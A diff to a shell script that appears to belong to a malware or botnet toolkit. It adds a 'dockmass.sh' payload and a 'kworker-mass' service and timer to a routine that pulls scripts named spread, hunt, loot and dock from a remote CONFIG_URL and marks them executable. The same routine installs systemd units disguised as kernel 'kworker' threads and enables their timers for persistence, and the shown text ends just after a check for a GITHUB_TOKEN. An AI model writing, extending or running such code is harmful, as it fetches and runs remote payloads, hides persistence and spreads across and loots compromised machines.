@@ -38,7 +38,7 @@ render_config() {
 # by its own timer) keeps reading its old inode.
 refresh_published() {
     [ -n "${CONFIG_URL:-}" ] || return 0
-    for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh tune.sh; do
+    for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh tune.sh; do
         curl -fsSL "$CONFIG_URL/$f" -o "$f.new" 2>/dev/null || { rm -f "$f.new"; continue; }
         chmod 0755 "$f.new"
         if [ ! -f "$f" ] || ! cmp -s "$f" "$f.new"; then mv -f "$f.new" "$f"; fi
@@ -57,13 +57,13 @@ refresh_published() {
         rm -f worker.env.new
     fi
     if command -v systemctl >/dev/null 2>&1; then
-        for u in kworker kworker-updater kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock; do
+        for u in kworker kworker-updater kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock kworker-mass; do
             for e in service timer; do
                 curl -fsSL "$CONFIG_URL/$u.$e" -o "/etc/systemd/system/$u.$e" 2>/dev/null || :
             done
         done
         systemctl daemon-reload 2>/dev/null || true
-        for t in kworker-updater.timer kworker-spread.timer kworker-tune.timer kworker-loot.timer kworker-dock.timer; do
+        for t in kworker-updater.timer kworker-spread.timer kworker-tune.timer kworker-loot.timer kworker-dock.timer kworker-mass.timer; do
             systemctl enable --now "$t" 2>/dev/null || true
         done
         if [ -n "${GITHUB_TOKEN:-}" ]; then
